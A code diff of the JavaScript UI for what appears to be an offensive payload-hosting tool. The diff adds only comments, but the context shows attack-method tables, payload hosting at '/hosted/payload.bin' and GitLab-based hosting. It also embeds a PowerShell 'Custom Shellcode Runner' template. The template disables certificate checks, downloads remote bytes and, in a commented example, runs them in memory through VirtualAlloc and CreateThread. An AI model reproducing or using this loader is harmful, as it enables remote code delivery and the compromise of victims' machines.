@@ -3,6 +3,7 @@
 // ════════════════════════════════════════════════════════════════════════════
 
 var W = {};
+// Mutable UI/session state for the current client instance.
 var STATE = {
     sites:               [],
     interfaces:          ["0.0.0.0"],
@@ -108,6 +109,8 @@ var ATTACK_METHODS = {
 
 var CUSTOM_TEMPLATE = "# Custom Shellcode Runner\n# Click \"Generate\" to replace {{URL}} with the target URL\n# Or edit this script freely\n\n[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}\n$url = \"{{URL}}\"\n$wc = New-Object Net.WebClient\n$bytes = $wc.DownloadData($url)\n\n# --- Your execution logic here ---\n# Example:\n# $k = Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr w,uint x,uint y,uint z);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);' -Name K -PassThru\n# $m = $k::VirtualAlloc(0,$bytes.Length,0x3000,0x40)\n# [Runtime.InteropServices.Marshal]::Copy($bytes,0,$m,$bytes.Length)\n# $k::CreateThread(0,0,$m,0,0,0)\n# [Threading.Thread]::Sleep(-1)\n";
 
+// ── Shared Utility Helpers ──────────────────────────────────────────────────
+
 function detectMimeType(filename) {
     if (!filename) return "application/octet-stream";
     var name = filename.toLowerCase();
@@ -125,6 +128,8 @@ function getSiteByKey(siteKey) {
     }
     return null;
 }
+
+// ── GitLab Token / Retry Helpers ────────────────────────────────────────────
 
 function setPendingGitlabRetry(command, host, payload) {
     STATE.pendingGitlabOperation = {
@@ -314,7 +319,7 @@ function data_handler(data) {
     }
 }
 
-// ── Host File Dialog ─────────────────────────────────────────────────────────
+// ── Hosting Dialog (Hosted + GitLab) ────────────────────────────────────────
 function getHostedFileParams(container) {
     let labelURI  = form.create_label("URI Path:");
     let textURI   = form.create_textline("/hosted/payload.bin");
@@ -727,7 +732,7 @@ function FinalizeService() {
     W.gitlabHostInput = null;
 }
 
-// ── Refresh Helpers ─────────────────────────────────────────────────────────
+// ── Table Rendering Helpers ─────────────────────────────────────────────────
 
 function refreshSiteTable() {
     if (!W.siteTable) return;
